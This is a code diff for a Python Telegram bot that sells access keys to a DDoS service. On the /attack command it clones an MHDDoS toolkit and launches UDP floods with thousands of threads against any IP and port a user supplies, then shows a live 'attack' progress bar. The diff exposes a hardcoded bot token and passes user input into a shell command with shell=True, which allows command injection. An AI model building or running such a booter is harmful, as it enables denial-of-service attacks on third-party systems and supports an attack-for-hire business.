@@ -11,61 +11,76 @@ TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
 ADMIN_ID = 6075779781 
 bot = telebot.TeleBot(TOKEN)
 
-# Database nahi chal raha isliye hum local memory use karenge
-users = {ADMIN_ID: "2029-12-31 23:59:59"} 
+# Temporary memory (Database Bypass)
+users = {6075779781: 9999999999} # Admin permanent active
 keys = {}
 
 # --- ENGINE SETUP ---
 if not os.path.exists("MHDDoS"):
     os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")
 
-# --- PROGRESS BAR ---
+# --- PROGRESS BAR FUNCTION ---
 def get_progress_bar(percent):
     bar_length = 10
     filled = int(percent / 10)
+    # Yeh line progress bar banayegi
     return "🔥" * filled + "🌑" * (bar_length - filled)
 
-# --- ATTACK LOGIC ---
+# --- ATTACK LOGIC WITH LIVE COUNTDOWN ---
 def run_attack(ip, port, duration, chat_id, message_id, username):
     threads = random.randint(1500, 2000)
     command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
+    
     try:
+        # Attack start
         process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
         start_time = time.time()
+        
+        # Live Countdown Loop
         while time.time() - start_time < duration:
             elapsed = time.time() - start_time
             remaining = int(duration - elapsed)
             percent = min(100, int((elapsed / duration) * 100))
             bar = get_progress_bar(percent)
+            
             try:
-                bot.edit_message_text(chat_id=chat_id, message_id=message_id,
+                bot.edit_message_text(
+                    chat_id=chat_id, message_id=message_id,
                     text=(f"🚀 **VVIP ATTACK ACTIVE** 🚀\n"
                           f"━━━━━━━━━━━━━━━━━━━━━━\n"
                           f"👤 **Attacker:** `@{username}`\n"
                           f"🎯 **Target:** `{ip}:{port}`\n"
                           f"⏳ **Remaining:** `{remaining}s` / `{duration}s`\n"
                           f"📊 **Power:** `{bar} {percent}%` \n"
-                          f"🛡️ **System:** `BYPASSING... ✅` \n"
-                          f"━━━━━━━━━━━━━━━━━━━━━━"), parse_mode="Markdown")
+                          f"🛡️ **Status:** `BYPASSING CLOUD... ✅` \n"
+                          f"━━━━━━━━━━━━━━━━━━━━━━"),
+                    parse_mode="Markdown"
+                )
             except: pass
-            time.sleep(5)
-        process.terminate()
-        bot.send_message(chat_id, f"✅ **SUCCESS!** Target `{ip}` hit. 🔥")
-    except: pass
+            time.sleep(4) # Refresh rate
 
-# --- HANDLERS ---
+        process.terminate()
+        # Finish Message
+        bot.send_message(chat_id, f"✅ **ATTACK FINISHED!**\n\nTarget `{ip}` was successfully hammered. 🔥\nBot is now ready for the next command.")
+    
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Error: {str(e)}")
+
+# --- KEYBOARDS ---
 def main_menu():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     markup.add('🚀 Start VVIP Attack', '👤 My Profile', '🔑 Redeem Key')
     return markup
 
+# --- HANDLERS ---
+
 @bot.message_handler(commands=['start'])
 def welcome(m):
     user_id = m.from_user.id
     if user_id in users or user_id == ADMIN_ID:
-        bot.send_message(m.chat.id, f"💀 **Welcome Boss @{m.from_user.username}!**", reply_markup=main_menu())
+        bot.send_message(m.chat.id, f"💀 **Welcome Boss @{m.from_user.username}!**\nSystem Online Hai.", reply_markup=main_menu())
     else:
-        bot.send_message(m.chat.id, "🚫 **ACCESS DENIED, CHUTIYE!**\nContact @FLEXOP01 for Key. 🖕")
+        bot.send_message(m.chat.id, "🚫 **ACCESS DENIED!** 🚫\nContact @FLEXOP01 for Key. 🖕")
 
 @bot.message_handler(commands=['genkey'])
 def gen(m):
@@ -84,19 +99,22 @@ def redeem(m):
         key_text = m.text.split()[1]
         if key_text in keys:
             days = keys[key_text]
-            users[user_id] = (time.time() + (days * 86400))
+            users[user_id] = time.time() + (days * 86400)
             del keys[key_text]
-            bot.reply_to(m, "🎉 **ACCESS GRANTED!** Use `/attack IP PORT TIME`", reply_markup=main_menu())
-        else: bot.reply_to(m, "❌ Invalid Key!")
+            bot.send_message(m.chat.id, f"🎉 **ACCESS GRANTED!**\n\nAb tere paas **{days} din** ki power hai. 🔥\n\n**Example:** `/attack IP PORT TIME`", reply_markup=main_menu())
+        else:
+            bot.reply_to(m, "❌ Invalid Key!")
     except: pass
 
 @bot.message_handler(func=lambda m: m.text == '🚀 Start VVIP Attack')
 def guide(m):
-    bot.reply_to(m, "🚀 **Attack Command:**\n`/attack IP PORT TIME` \n\nExample: `/attack 1.1.1.1 80 60`")
+    bot.reply_to(m, "🚀 **Attack Example:**\n\n`/attack 1.1.1.1 80 120` \n\n(IP: Target, Port: 80, Time: Seconds)")
 
 @bot.message_handler(func=lambda m: m.text == '👤 My Profile')
 def profile(m):
-    bot.send_message(m.chat.id, f"👤 **PROFILE**\n🆔 ID: `{m.from_user.id}`\n📊 Status: Active ✅")
+    user_id = m.from_user.id
+    status = "Active ✅" if (user_id in users or user_id == ADMIN_ID) else "No Access ❌"
+    bot.send_message(m.chat.id, f"👤 **USER PROFILE**\n🆔 ID: `{user_id}`\n📊 Status: {status}")
 
 @bot.message_handler(commands=['attack'])
 def handle_attack(m):
@@ -104,10 +122,19 @@ def handle_attack(m):
     if user_id in users or user_id == ADMIN_ID:
         try:
             p = m.text.split()
-            sent = bot.reply_to(m, "📡 **CRACKING SERVER... ⚡**")
+            if len(p) < 4:
+                bot.reply_to(m, "❌ Format: `/attack IP PORT TIME` \nExample: `/attack 1.1.1.1 80 60`")
+                return
+            
+            # Message jise hum edit karke countdown dikhayenge
+            sent = bot.reply_to(m, "📡 **CRACKING PROTECTION... ⚡**")
+            
+            # Start attack in new thread
             threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
-        except: bot.reply_to(m, "Format: `/attack IP PORT TIME`")
-    else: bot.reply_to(m, "❌ Pehle Key dalo!")
+        except: pass
+    else:
+        bot.reply_to(m, "❌ Pehle Key dalo!")
 
-print("🚀 Bot is Online (Database Bypassed)!")
+print("🚀 Full Feature Bot Live!")
 bot.infinity_polling()
+        
